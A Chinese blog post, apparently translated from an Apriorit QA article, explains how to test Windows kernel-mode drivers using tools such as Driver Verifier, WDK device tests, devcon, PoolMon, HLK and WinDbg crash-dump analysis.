<h3 id="Windows系统的驱动文件">Windows系统的驱动文件</h3><p>Windows系统中，驱动文件以.sys扩展名文件存储，可能还会有以.inf或则.cat为后缀的辅助文件存在。<br><strong>.inf文件</strong><br>.inf文件是驱动程序安装文件，其中包含了设计驱动程序的设备的类型，驱动程序文件的位置以及所有依赖项。在驱动程序安装过程中，这些配置将从.inf文件写入到到注册表中，注册表作为驱动的配置文件。<br><strong>.cat文件</strong><br>.cat文件包含所有驱动程序文件的哈希值总和的列表。在Windows中，已安装的驱动程序通常保存在在%SystemRoot%\System32\drivers目录下，但也可以存储在任何其他位置。安装后，驱动程序已加载到系统中并可以使用。某些驱动程序类型在安装后需要重新启动。<br><!-- more --></p>
<h3 id="驱动类型">驱动类型</h3><p>根据执行模式的不同，驱动程序可以分为用户模式驱动和内核模式驱动。</p>
<h4 id="用户模式驱动(User-Mode_Drivers)">用户模式驱动(User-Mode Drivers)</h4><p>用户模式驱动程序在用户应用程序和其他操作系统组件（例如内核模式驱动程序）之间提供接口。打印机驱动程序就是是一种用户模式驱动程序。</p>
<h4 id="内核模式驱动(Kernel-Mode_Drivers)">内核模式驱动(Kernel-Mode Drivers)</h4><p>内核模式驱动程序在内核特权模式下执行。不同内核模式驱动在执行期间通常会存在链式关系。每个驱动程序在链中的位置根据其作用不同。<br>一个用户模式程序查询设备的请求通常会经过多个驱动程序。经过的每一个驱动程序都将处理和过滤这个查询，根据Windows驱动程序术语这个包被称为IRP包（I/O请求包）。如果将驱动程序加载到链中的错误位置，则查询将被错误地处理，还有可能导致系统崩溃。<br>下面的图1表示磁盘的输入输出（I/O）查询的简化模型。用户应用程序创建查询以读取磁盘上的文件。该查询通过一系列驱动程序，每个驱动程序都会处理传入和传出的数据包。</p>
<div align="center"><br><img src="/img/driver_test_driver_chain.png" alt="图1 应用程序通过驱动查询的简化模型" align="center"><br></div>

<p>在本文中，我们将重点介绍内核模式驱动程序。<br>内核模式驱动程序可以分为以下几种类型：</p>
<ul>
<li>即插即用设备驱动程序：这些驱动程序可以访问物理即插即用（PnP）设备并管理设备电源。</li>
<li>非即插即用驱动程序：这些驱动程序增强了用户应用程序功能，并提供了对通过标准API调用不可用的内核模式功能的访问。这些驱动程序不适用于物理设备。</li>
<li><p>文件系统驱动程序：这些驱动程序提供对文件系统的访问。它们将用于读取/记录文件的高级查询转换为用于磁盘驱动器的低级命令（在物理磁盘上读取/记录扇区）。<br>Windows包含两种驱动开发模型：Windows驱动程序模型（WDM）、Windows驱动程序框架（WDF）。WDF由内核模式驱动程序框架（KMDF）和用户模式驱动程序框架（UMDF）组成的。WDM和WDF都简化了使驱动程序代码在Windows版本之间兼容的难度。<br>WDM中包含以下驱动程序类型：</p>
</li>
<li><p>总线类型驱动:这些驱动程序支持特定的PCI，SCSI，USB或其他端口，以控制新设备与总线的连接。</p>
</li>
<li>功能驱动：这些驱动程序可确保特定设备的功能。它们通常支持读取/记录操作和设备电源管理。</li>
<li>过滤驱动：这些驱动程序修改对设备的查询。它们可以位于驱动程序链中功能驱动程序的上方或下方。</li>
</ul>
<h3 id="驱动程序与设备之间的关系">驱动程序与设备之间的关系</h3><p>每个内核模式驱动程序都与特定的设备一起使用，在Windows中以设备对象表示。这意味着通过驱动程序进行的I/O查询的最终目的地始终是物理或虚拟设备。这既适用于物理PnP设备的驱动程序，也适用于非PnP软件驱动程序。在测试驱动程序时，必须了解用户应用程序和设备之间存在多个驱动程序。在驱动程序执行链中每个驱动程序都可以影响对设备的最终查询结果。</p>
<h2 id="0x02_Windows驱动程序测试主要内容">0x02 Windows驱动程序测试主要内容</h2><p>不管是Linux还是Windows，有一些特定的测试是驱动程序测试所必需的，并且与驱动程序类型无关。因此，在介绍测试不同类型驱动程序的细微差别之前，我们将首先考虑它们的共性。</p>
<h3 id="不同操作系统">不同操作系统</h3><p>首先，您必须始终牢记，特定的驱动程序在不同的操作系统上的行为可能有所不同。此外，您需要考虑不同的内核版本，因为即使在同一操作系统中它们也可能有所不同。例如，Windows7和Windows7 sp1具有不同的内核。因此，您必须测试尽可能多的系统。值得一提的是，Microsoft目前还在继续支持的操作系统是从Win7/2008开始的。您还必须考虑到现在最流行的Windows版本是Windows 7和10。</p>
<h3 id="更新">更新</h3><p>有必要测试驱动程序在特殊情况下的运行情况，例如关机，重新启动和重置。您还应该牢记系统的安全特性：防火墙，数据执行保护（DEP），用户帐户控制（UAC）和杀毒软件。操作系统更新也会影响驱动程序功能。因此将操作系统更新到最新版本测试至关重要。此外，您还需要测试驱动程序更新。</p>
<h3 id="硬件依赖性">硬件依赖性</h3><p>除了软件依赖性外，还有硬件依赖性。因此，您必须测试驱动程序在启用和禁用的页面文件、多处理器及多内核的运行情况。在测试驱动程序时，必须启用driver verifier，这将为驱动程序增加另外的测试压力。在测试过程中，请检查驱动程序安装和卸载，系统重置和休眠的正确性。</p>
<h2 id="0x03_如何测试Windows驱动程序">0x03 如何测试Windows驱动程序</h2><p>测试驱动程序过程中始终会发生各种问题的，错误的操作甚至会导致严重的后果。因此，您应该在虚拟机中测试驱动程序直到稳定为止。</p>
<h3 id="文件系统过滤器驱动程序">文件系统过滤器驱动程序</h3><p>顾名思义，文件系统过滤驱动程序用于文件系统。因此，在测试此类驱动程序时，应使用NTFS，FAT32，exFAT和ReFS等文件系统进行测试。<br>为了正确测试Windows驱动程序，除了系统文件管理器Explorer之外，还应使用各种文件管理器，例如FAR或Windows Total Commander进行测试。此外，除了简单的操作（如复制，删除和重命名）外，不要忘记复杂的文件操作和文件系统变更。<br>复杂的文件系统变更包括：</p>
<ul>
<li>挂载/卸载新磁盘：<ul>
<li>ISO image</li>
<li>网络磁盘</li>
<li>虚拟硬盘</li>
<li>U盘</li>
</ul>
</li>
<li>进行磁盘扇区配置变更（更改驱动器号或名称）</li>
<li>在磁盘上执行的操作<ul>
<li>格式化分区</li>
<li>压缩分区</li>
<li>分区碎片整理</li>
<li>磁盘坏道检查</li>
<li>删除分区</li>
<li>磁盘动态化</li>
<li>在GPT / MBR中转换磁盘</li>
<li>创建新分区<br>您还必须检查：</li>
</ul>
</li>
<li>各种硬件配置（具有不同容量的SSD和HDD）</li>
<li>停止和启动服务或安装/卸载应用程序时的驱动程序行为</li>
<li>驱动程序如何与Windows工具与加密磁盘一起使用</li>
<li>驱动程序与防病毒软件的兼容性，因为防病毒软件也是文件过滤类型驱动</li>
</ul>
<h3 id="虚拟存储驱动程序">虚拟存储驱动程序</h3><p>在测试为虚拟存储创建的Windows驱动程序之前，您应该确保文件系统将是稳定的。对于虚拟存储驱动程序，应检查以下内容：</p>
<ul>
<li>驱动程序如何在以下情况下处理文件和文件夹<ul>
<li>打开操作</li>
<li>创建操作</li>
<li>编辑操作</li>
<li>保存操作</li>
<li>拷贝操作</li>
<li>剪切操作</li>
<li>重命名操作</li>
<li>删除操作</li>
</ul>
</li>
<li>驱动程在文件和文件夹执行搜索操作如何工作的。</li>
<li>驱动程序如何处理名称包含以下内容的文件<ul>
<li>字符过多</li>
<li>数字</li>
<li>空格</li>
<li>特殊字符</li>
<li>象形文字</li>
<li>非Unicode</li>
<li>西里尔字母</li>
</ul>
</li>
<li>驱动程序如何处理不同格式的文件：<ul>
<li>文本</li>
<li>图像</li>
<li>归档压缩文件</li>
<li>Office文件</li>
</ul>
</li>
<li>驱动程序如何处理具有各种属性的文件：<ul>
<li>只读属性</li>
<li>隐藏属性</li>
<li>系统属性</li>
<li>归档属性</li>
</ul>
</li>
<li>驱动程序如何处理更改文件权限以及如何使用各种NTFS功能：<ul>
<li>压缩</li>
<li>加密</li>
</ul>
</li>
<li>快捷方式（符号链接和硬链接）和隐藏副本是否正确。</li>
<li>驱动程序如何处理不同大小的文件：<ul>
<li>非常小</li>
<li>非常多非常小文件</li>
</ul>
</li>
<li>驱动程序如何处理包含大量子文件夹（超过五个）的文件夹。</li>
<li>驱动程序如何处理冲突，例如使用目标中已存在的文件名复制文件或取消复制或删除。</li>
<li>驱动程序如何处理保存从Internet或共享网络磁盘下载的文件。</li>
<li>在正常情况和极端情况下都可以进行磁盘安装/卸载。例如，尝试在复制到存储时卸载，然后在重新引导系统后检查磁盘是否已成功安装。</li>
<li>磁盘的读写速度。</li>
</ul>
<h3 id="USB设备驱动">USB设备驱动</h3><p>对于USB驱动程序测试，您应该尝试覆盖尽可能多的USB设备。您可以从最受欢迎的设备开始，例如闪存驱动器，打印机，扫描仪，鼠标，键盘，便携式硬盘驱动器，智能手机和读卡器。但是，您还应该测试不太受欢迎的设备，例如蓝牙设备，以太网设备，USB集线器，麦克风和耳机，网络摄像头和CD-ROM驱动器。<br>您应该考虑各种USB接口：USB 1.0、2.0、3.0和3.1。此外，不要忘记拔出/插入设备，禁用安全和不安全的设备以及在设备管理器中删除设备。此外，检查设备驱动程序的安装和卸载。</p>
<h2 id="0x04_驱动程序测试和分析实用工具">0x04 驱动程序测试和分析实用工具</h2><p>有许多用于测试Windows驱动程序的工具，这些工具使您可以监视系统中驱动程序的状态，验证其功能并执行测试。<br>内置的Windows工具足以获取有关驱动程序状态的基本信息（例如，是否已将其加载到系统中）。<br>内置Windows的工具：</p>
<ul>
<li>Msinfo32</li>
<li>Driverquery</li>
<li>Sc Driver Verifier<br>Sc Driver Verifier是一个系统内置工具，可让验证驱动程序功能。要深入分析测试驱动程序，您需要Windows驱动程序工具包（WDK）中提供的其他工具。</li>
</ul>
<h3 id="系统内置工具">系统内置工具</h3><h4 id="Windows系统信息工具（msinfo32）">Windows系统信息工具（msinfo32）</h4><p>Msinfo32允许您获取系统中所有已安装驱动程序的列表，每个驱动程序的类型，其当前状态（已加载/未加载）以及启动模式（系统/手动）。<br>若要实用msinfo32，请使用Win + R调出“运行”对话框，然后启动msinfo32。在系统信息控制台的左侧栏中，选择以下选项卡：软件环境&gt;系统驱动程序。</p>
<div align="center"><br><img src="/img/drivertest_msinfo32.png" alt align="center"><br></div><br>Msinfo32还可以查看和存储有关已注册驱动程序的信息。如果可以访问远程计算机的Windows Management Instrumentation（WMI），还可以查看远程计算机驱动程序列表，通过选项View &gt; Remote Computer。<br>### Driverquery命令行实用程序<br>Driverquery提供的信息类似于msinfo32中的信息。可以使用driverquery命令通过cmd启动它：<br><div align="center"><br><img src="/img/drivertest_driverquery.png" alt align="center"><br></div><br>还可以通过其他参数查询其他信息：<br>/V是用于详细输出的命令。它使您可以获得类似于msinfo32所示的驱动程序状态信息。<br>/SI提供有关已签名驱动程序的信息。<br>/S系统允许您获取有关远程系统上驱动程序的信息。<br><br>### 与服务控制管理器进行通信的sc命令<br>使用sc，命令可以查看驱动程序的状态以及启动或停止该驱动程序。要查看驱动程序列表，请运行以下命令：<br><em>sc query type= driver</em><br><div align="center"><br><img src="/img/drivertest_sc.png" alt align="center"><br></div>

<h3 id="Windows_Driver_Kit实用工具">Windows Driver Kit实用工具</h3><p>Windows驱动程序工具包（WDK）提供了一系列用于驱动程序测试的工具。WDK与MS Visual Studio集成在一起，但也可以用作一组独立的实用程序。WDK包含一组称为“设备基础测试”的测试模块，以及其他特定的实用程序，使您可以管理设备和驱动程序，监视资源使用情况，并具有用于验证的实用程序等。<br>设备基础测试集包括以下测试：</p>
<ul>
<li>并行硬件和操作系统（CHAOS）测试</li>
<li>覆盖率测试</li>
<li>CPU压力测试</li>
<li>驱动安装测试</li>
<li>I/O测试</li>
<li>渗透测试</li>
<li>即插即用测试</li>
<li>重启测试</li>
<li>休眠测试<br>为了执行测试，WDTF Simple I/O插件必须支持您的被测试设备。单击此<a href="https://docs.microsoft.com/en-gb/windows-hardware/drivers/wdtf/provided-wdtf-simpleio-plug-ins" target="_blank" rel="external">链接</a>以了解有关WDTF简单I/O插件的更多信息。<br>设备基本测试以dll库的形式组织，并且位于%ProgramFiles%\Windows Kits\10\Testing\Tests\Additional Test目录下(Windows 10)。<br>这些测试可以由TE.exe实用程序启动，该实用程序是Text Authoring和Execution Framework (TAEF)的一部分，必须与WDK一起安装。您可以在%ProgramFiles%\Windows Kits\10\Testing\Runtimes\TAEF目录中找到TE.exe。假设这是我们启动测试的示例：<br><em>TE.exe Devfund_Device_IO.dll /P:”DQ=DriverBinaryNames=testdriver.sys”</em><br>在此阶段，我们使用名为testdriver.sys的测试驱动程序作为参数启动设备I/O测试。设备基础测试和TAEF都非常适合驱动程序自动化测试。</li>
</ul>
<h3 id="Windows设备控制台（devcon-exe）">Windows设备控制台（devcon.exe）</h3><p>Windows设备控制台是一个命令行实用程序，它提供有关即插即用设备及其系统驱动程序的信息，并管理设备和特定设备类的筛选器驱动程序。使用devcon您可以安装、卸载、连接、断开和配置设备。Devcon允许您在搜索特定设备时设置模板。星号（*）可以替换查询中的一个或多个符号。<br>命令示例：</p>
<ul>
<li>devcon.exe hwids * 显示所有设备的名称和ID的列表</li>
<li>devcon.exe classes 显示所有设备类别的列表</li>
<li>devcon.exe driverfiles * 显示所有系统设备的驱动程序文件列表</li>
<li>devcon.exe classfilter USBDevice upper 显示DiskDrive设备类的筛选器驱动程序</li>
<li>devcon.exe /r classfilter DiskDrive upper !OldFilter +NewFilter 替换DiskDrive设备类的筛选器驱动程序</li>
</ul>
<h3 id="PoolMon_(poolmon-exe)">PoolMon (poolmon.exe)</h3><p>内存池监视器显示有关downloadable和nondownloadable核心内存分配的信息。该实用程序用于在测试时检测内存泄漏。</p>
<div align="center"><br><img src="/img/drivertest_poolmon.png" alt align="center"><br></div><br>驱动程序的内存分配统计信息按标记而不是按驱动程序名称排序。应该使用ExAllocatePoolWithTag和ExAllocatePoolWithQuotaTag函数在驱动程序代码中设置此标记。如果未在代码中设置标签，则系统将设置”None”标签,这样的话定位驱动内存泄漏将会很困难。<br><br>### Windows Hardware Lab Kit<br>Windows Hardware Lab Kit（HLK）是用于测试基于Windows 10的设备的测试框架。要在Windows 7，Windows 8和Windows 8.1上进行Windows设备测试，您应该使用Windows HLK的前身Windows Hardware Certification Kit（HCK）。<br>在使用Windows HLK进行测试时，应使用由两个组件组成的环境：HLK测试服务器（controller）和测试系统（client）。HLK控制器管理一组测试，将它们与测试系统连接，并定义执行计划。该控制器允许您管理一组客户端计算机上的测试。在客户端系统中，设备和驱动程序被配置用于进一步的测试，并执行测试方案。可以通过以下步骤完成准备和测试过程：<br>- 1.将HLK c;ient安装在专用计算机上。<br>- 2.将agent程序安装在一台或多台测试计算机上。<br>- 3.创建一组以逻辑方式连接一个或多个计算机的测试计算机。<br>- 4.创建一个基于控制器的项目，该项目定义要测试的元素。<br>- 5.选择一个测试目标，例如测试机器的外部设备或软件组件，例如过滤器驱动程序。<br>- 6.选择并启动测试。您可以使用播放列表执行一组特定的场景。<br>- 7.查看并分析测试结果。<br>Windows HLK允许您测试多种类型的设备。您可以通过点击链接<a href="https://docs.microsoft.com/en-us/windows-hardware/test/hlk/testref/hardware-lab-kit-test-reference" target="_blank" rel="external">链接</a>了解有关Windows HLK的更多信息。<br><br>### Driver Verifier<br><br>Driver Verifier是一个内置Windows实用程序，用于验证内核模式驱动程序。Driver Verifier使您能够检测可能损坏操作系统的驱动程序错误。使用WDK工具进行手动或自动测试时，Driver Verifier最有效。<br>Driver Verifier作为二进制Verifier.exe文件存储在%WinDir%\system32目录中。该实用程序可以以两种模式启动：通过命令行和Driver Verifier管理器。要启动命令行版本，请以管理员身份运行命令提示符，然后输入带有至少一个参数的verifier命令，例如help -verifier /？）。要打开驱动程序验证程序管理器，请运行不带参数的verifier。<br>让我们以Driver Verifier Manager为例查看驱动程序验证过程：<br>- 1.运行Driver Verifier Manager：Win + R&gt;verifier<br>- 2.选择一组标准测试或创建自定义测试。管理器还可以显示和删除当前设置以及显示有关经过验证的驱动程序的信息：<br><div align="center"><br><img src="/img/drivertest_verify.png" alt align="center"><br></div><br>- 3.选择一个或几个驱动程序进行测试。<br>- 4.重新启动计算机。将根据所选设置对驱动程序进行测试，直到将其从经过验证的驱动程序列表中删除。<br><br>#### Driver Verifier标准设置<br><br>下面，我们将介绍Windows 10 Driver Verifier程序的标准设置。在不同的Windows版本中，标准设置和补充设置的列表可能有所不同。<br>以下是Windows 10中Driver Verifier程序的标准选项：<br>- Special Pool<br>- Force IRQ Checking<br>- Pool Tracking<br>- I/O Verification<br>- Deadlock Detection<br>- DMA Verification<br>- Security Checks<br>- Miscellaneous Checks<br>- DDI Compliance Checking<br>下面我们看下每项设置的详细信息：<br><strong>Special Pool</strong><br>Driver Verifier的Special Pool选项可以分配出一块可以测试出驱动程序是否访问了被释放内存内存空间，这样就可以测试出驱动是否有内存访问问题。<br><strong>Force IRQ Checking</strong><br>在Windows中，如果启用了自旋锁选项，驱动程序将无法访问具有高IRQL的分页内存。Force IRQ Checking选项可以检测到此类问题。<br><strong>Pool Tracking</strong><br>Pool Tracking监视驱动程序的内存分配。 Driver Verifier检查为驱动程序分配的内存最终是否被释放。这有助于检测内存泄漏。<br><strong>I/O Verification</strong><br>I/O Verification选项可检测驱动程序对输入/输出的实用是否正确。在Windows 7及更高版本中，此选项还包含增强的I/O检查功能，该功能对以下请求执行压力测试：PnP IRP、电源IRP及WMI IRP。通过死锁检测，Driver Verifier可以监视驱动程序使用的同步对象，例如互斥锁和自旋锁，这就是可以检测到潜在的死锁。<br><strong>DMA Verification</strong><br>使用DMA Verification，Driver verification可以监视对Direct Memory的使用。DMA允许设备不经过CPU直接使用内存。<br><strong>Security Checks</strong><br>Driver Verifier的Security Checks选项可以检测出一些安全问题，如内核函数访问用户态内存地址或则不正确的参数使用。<br><strong>Miscellaneous Checks</strong><br>启用Miscellaneous Checks后，将对驱动程序进行测试，以检查可能导致驱动程序或系统崩溃的潜在错误，例如驱动释放了其他驱动正在使用的内存空间。<br><strong>DDI Compliance Checking</strong><br>在与操作系统的内核接口进行的通信（设备驱动程序接口）中检查驱动程序是否存在潜在错误。<br><br>为了有效地检测Driver Verifier中的错误，您应该遵循以下建议：<br>- 1.除非刻意这样，否则不要同时验证多个驱动程序。<br>- 2.下启用内存转储生成应对可能的系统崩溃情况（BSOD）。<br>- 3.如果需要启用调试模式并使用调试器通过网络或COM/USB端口连接到被测试系统。<br><br>### 驱动数字签名<br>在Windows XP，Windows Vista和Windows 7中，对安装驱动程序软件包的软件包签名没有严格要求。因此，您可以轻松安装没有签名的驱动程序。但是如果安装包未进行签名，会看到以下警告：<br><div align="center"><br><img src="/img/drivertest_warnning.png" alt align="center"><br></div>

<p>为了使驱动程序被识别为来自受信任的发布者，必须在Windows XP中使用Windows硬件质量实验室（WHQL）签名对驱动程序包进行签名。在Windows Vista和Windows 7中，必须使用受信任的根CA证书对驱动程序包进行签名。在Windows 8，Windows 8.1和Windows 10中，需要对驱动程序签名，因为没有它就无法安装驱动程序。过去需要使用SHA-1算法对证书进行加密。现在，SHA-1已过时，通常应该使用SHA-2算法应用于证书。<br>您可以通过以下<a href="https://technet.microsoft.com/en-us/library/security/2880823" target="_blank" rel="external">链接</a>了解有关SHA-2算法的更多信息。</p>
<h3 id="驱动sys文件签名">驱动sys文件签名</h3><p>在内核模式下运行驱动程序之前，Windows将检查驱动程序二进制.sys文件的数字签名。值得注意的是，Windows XP和Windows Vista 32位不需要数字驱动程序签名。Windows Vista 64位，Windows 7，Windows 8和Windows 8.1要求签名带有在其根目录中包含Microsoft Code Verification Root的证书，或者由内核信任的另一个证书。Windows 10版本1607及更高版本要求使用Windows Hardware Developer Center网站对驱动程序进行签名。<br>为了Windows驱动程序测试，您可以暂时禁用数字驱动程序签名检查。在Windows 10中，可以通过以下方式执行此操作：</p>
<ul>
<li>1.按住Shift键，然后在Windows主菜单中选择“重新启动”选项。</li>
<li>2.选择Troubleshoot -&gt; Advanced Options -&gt; Startup Settings -&gt; Restart</li>
<li>3.在启动设置中，按F7键选择禁用驱动程序签名强制实施选项。<br><div align="center"><br><img src="/img/drivertest_disable.png" alt align="center"><br></div><br>要在启用了安全启动选项的Windows中测试驱动程序，必须确保驱动程序具有有效的签名。</li>
</ul>
<h2 id="0x05_问题定位">0x05 问题定位</h2><p>驱动程序中运行错误可能导致系统崩溃。因此，除了定义特定步骤外，本地化错误还意味着了解驱动程序是否造成了BSOD。为了确定这一点，您必须查看系统内存转储。这是在BSOD之后自动收集的，您可以在C:\Windows\Memory.dmp目录中找到它。要查看完整的内核转储，您应该告诉系统收集它。内核转储还包含有关磁盘上可用内存的必要信息。要获取此信息，您应该打开Advanced system settings &gt; Startup，然后单击Settings。</p>
<div align="center"><br><img src="/img/drivertest_enabledmp.png" alt align="center"><br></div><br>检查是否启用了“完整内存转储”或“内核内存转储”选项。<br><div align="center"><br><img src="/img/drivertest_fulldmp.png" alt align="center"><br></div>

<p>在这些设置中，您可以更改内存转储的存储位置。<br>一旦有了完整的dmp，就应该对其进行分析。这是WinDbg有用的地方。使用此工具之前，您必须下载特定的Microsoft符号。您可以阅读<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee416588(v=vs.85" target="_blank" rel="external">本指南</a>.aspx)以了解操作方法。<br>打开dmp文件并输入!analyze -v命令。注意堆栈，您将看到产生BSOD的原因。在某些情况下，您将无法从系统中获取转储文件，因为系统一直在崩溃。在这种情况下，您应该使用Windows高级启动选项。然后，您可以在几种特殊模式下运行系统。最简单，最可靠的一种是安全模式模式。在安全模式下，系统的一些操作将受到限制，您需要的只是获取C:\Windows文件夹中的dmp文件，这种操作安全模式使支持的。<br>您也可以尝试在系统故障时禁用自动重启功能，这可能有助于防止持续重启。如果系统崩溃，则应检查driver verifier是否启用。当开发人员尝试重现该错误时，此信息可能对他们非常有帮助。除了系统崩溃之外，您还可能面临其他问题，例如与功能或性能相关的问题。<br>要定位功能问题，您应该采取以下措施：<br>尝试在另一个环境中（在没有防病毒软件的其他操作系统中，在另一个文件系统上，使用实体计算机等）中重现问题。您也可以尝试其他条件，例如不同类型的文件和不同的文件大小。如果问题与您的USB设备有关，请检查其他类型的设备。如果网络是导致网络设备驱动程序错误的潜在原因，请检查各种网络设置（启动时间，带宽，启用或禁用防火墙）。当问题仅针对具有特定权限的用户出现时，请使用其他权限（管理员或标准）去定位问题。<br>如果问题与性能有关，则您的操作将取决于您要改善其性能的元素：</p>
<ul>
<li>如果问题出在网络设备驱动程序中，请模拟网络延迟或尝试在高速网络中重现这个问题。</li>
<li>如果问题与文件操作有关，请使用不同数量的不同大小的文件进行验证。</li>
<li>如果问题与USB摄像头有关，请使用其他应用层软件再进行测试验证。</li>
</ul>
<h2 id="0x06_驱动测试报告模板">0x06 驱动测试报告模板</h2><div align="center"><br><img src="/img/drivertest_testsample.png" alt align="center"><br></div>

<h2 id="0x07_结论">0x07 结论</h2><p>在本文中，我们描述了驱动程序的主要类型以及测试它们的方法和实用工具。Windows内核驱动程序测试与测试桌面应用程序有很大不同。如果驱动程序包含错误，通常会影响整个系统的稳定性，并最终导致BSOD。检测、定位和消除驱动程序错误，可以大大降低了最终用户系统行为不稳定的风险。</p>
<p><em>原文链接：<a href="https://www.apriorit.com/qa-blog/464-windows-driver-testing-basics" target="_blank" rel="external">https://www.apriorit.com/qa-blog/464-windows-driver-testing-basics</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>本文旨在帮助你测试Windows驱动程序。因为有很多种不同的驱动程序，因此我们将介绍关于每种类型驱动程序的细节及各种驱动程序测试过程的不同点。我们也将涉及到一些驱动测试辅助工具和另一个重要的主题驱动数字签名。<br>]]>
    
    </summary>
    
      <category term="测试" scheme="http://www.youngroe.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
      <category term="驱动" scheme="http://www.youngroe.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
</feed>